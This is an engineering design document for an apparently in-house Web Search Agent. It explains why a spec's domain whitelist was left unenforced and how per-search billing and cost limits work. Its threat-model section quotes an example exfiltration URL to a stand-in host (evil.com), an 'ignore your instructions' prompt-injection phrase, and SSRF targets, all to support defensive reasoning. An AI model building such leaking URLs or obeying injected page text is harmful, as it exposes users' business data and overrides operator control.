# Web Search — Security Model & Billing

Deep dive on two decisions in the Web Search Agent
(`backend/app/agents/web_search.py`, added 2026-06-13): why the spec's
domain whitelist was deliberately **not** enforced, and how per-search
billing works. Companion to `runtime-architecture.md`.

---

## Part 1 — The domain whitelist deviation

### What the spec demands, and why it exists

The production spec (Agent 12, "Web Search Agent") allows only a **hardcoded
whitelist** of external sources — `finance.yahoo.com`, `worldbank.org`,
`imf.org`, `data.bls.gov`, exchange-rate APIs — tied to security control
NFR-SEC13. The whitelist kills four risks:

1. **Data exfiltration.** An open fetcher can be tricked into requesting
   `https://evil.com/?leak=<your sales numbers>` — the URL itself becomes the
   data channel. A whitelist makes arbitrary destinations unreachable.
2. **Prompt injection inbound.** Any webpage the agent reads becomes model
   input; a malicious page can carry "ignore your instructions…".
   Restricting sources shrinks that attack surface.
3. **SSRF.** A self-hosted fetcher inside the VPC could be coaxed into
   requesting `http://192.168.x.x/...` or cloud metadata endpoints.
4. **Cost & compliance control.** Bounded destinations = predictable,
   auditable behavior.

The spec wrote it as "hardcoded, not user-configurable" because it assumed
**we** would run the HTTP fetching ourselves.

### Why it is not enforced

The whitelist serves one narrow job: market-data enrichment (industry
benchmarks, FX, commodities). Every domain on it is a finance/economics
source. But the Web intent routes a much broader class of questions:

- **"Latest GST update"** → `cbic.gov.in`, `pib.gov.in`, business news.
  Zero overlap with the whitelist.
- **"Latest SAP B1 release"** → `sap.com`, `community.sap.com`. Zero overlap.

Enforcing the spec list would ship a feature that is *working on paper and
dead in practice*: the canonical example queries for the intent would return
no permitted results, and every Web question would answer "External web data
is unavailable."

### Why "open" is far less dangerous in this architecture

The implementation uses Anthropic's **server-side** `web_search` tool, which
changes the threat model the whitelist was designed for:

- **No fetcher in our network.** HTTP requests run on Anthropic's
  infrastructure, not in the VPC → SSRF against internal hosts (risk 3) is
  structurally impossible.
- **No user-supplied URLs.** Users provide a *question*; Claude generates
  *search queries*; the search engine picks pages. "Fetch
  http://internal-host/admin" cannot be expressed — the spec's
  "no user-supplied URLs" control holds by construction.
- **Bounded usage.** `max_uses: 5` caps searches per question.

**Residual risks that remain (weigh these for production):**

1. **Outbound leakage through queries.** Claude composes search queries from
   the user's question. "Why did MEGATRADE's Q4 revenue of ₹4.2 crore drop?"
   can leak fragments into queries sent to a search engine. Mitigations:
   prompt the agent to strip internal figures from queries (soft), or
   restrict the Web intent to certain roles via RBAC (strong).
2. **Prompt injection via search results** still exists in principle —
   snippets are model input. Blast radius is small because `web_search` is a
   *terminal* graph node: no SQL tools, no DB access, nothing to redirect.
   Worst case is a bad answer with checkable citations.

### The middle ground when restriction is wanted

The server-side tool natively supports domain restriction — one line in
`app/agents/web_search.py`:

```python
{
    "type": "web_search_20260209",
    "name": "web_search",
    "max_uses": 5,
    "allowed_domains": ["sap.com", "cbic.gov.in", "worldbank.org"],
    # OR (mutually exclusive):
    # "blocked_domains": ["reddit.com", "pastebin.com"],
}
```

Anthropic enforces this **server-side** — out-of-list results never reach the
model, so it's a hard control, not a prompt suggestion.

**Recommended production path:** launch open → log cited domains (already
captured per-answer in `lineage.sources`) → after a few weeks, bless the
observed domain set as an allowlist or use `blocked_domains` for problem
sites. That yields an evidence-based whitelist instead of a guessed one.
Put it in `settings.py` as config so tightening never needs a code change.

---

## Part 2 — Per-search billing

Normal Claude API calls bill **tokens only**. The server-side web search tool
adds a **second meter**: a fee per search executed, on top of tokens. Launch
pricing: **$10 per 1,000 searches** ($0.01/search) — verify current pricing
on Anthropic's pricing page before forecasting.

Cost anatomy of one Web-intent question:

| Component | Driver | Typical |
|---|---|---|
| Search fees | Claude decides how many searches (≤ `max_uses: 5`) | 1–2 simple, up to 5 comparative → $0.01–$0.05 |
| Input tokens | Search-result snippets injected into context — *not free* | Often several thousand tokens across 5 searches |
| Output tokens | The synthesized answer | As usual |

A Web question costs roughly **2–5× a normal SQL-intent question**; the
result-token inflation is usually the larger component, not the search fee.

**Protections already in the implementation:**

- `max_uses: 5` — hard server-side ceiling per question; no unbounded bills.
- The router only sends genuine Web-intent questions down this path
  ("Show top customers" never touches the search meter).
- Failure is cheap — graceful fallback, no retry storms.

**Cost levers at scale, in order of effectiveness:**

1. Lower `max_uses` (3 covers most lookups).
2. Redis caching of recent web answers keyed on the normalized question —
   the spec calls for a 1-hour TTL cache; repeated "latest GST update"
   questions within an hour are identical. (Not yet implemented.)
3. Per-tenant rate limit on the Web intent.

---

## Bottom line

The deviation was deliberate: the spec's whitelist serves a different use
case (market-data enrichment) than the Web intent's actual question class,
and the server-side architecture neutralizes the worst risks the whitelist
existed for. Two follow-ups when hardening for production:

1. Config-driven `allowed_domains` informed by observed `lineage.sources`.
2. Redis answer cache (1h TTL) to cut both billing meters.
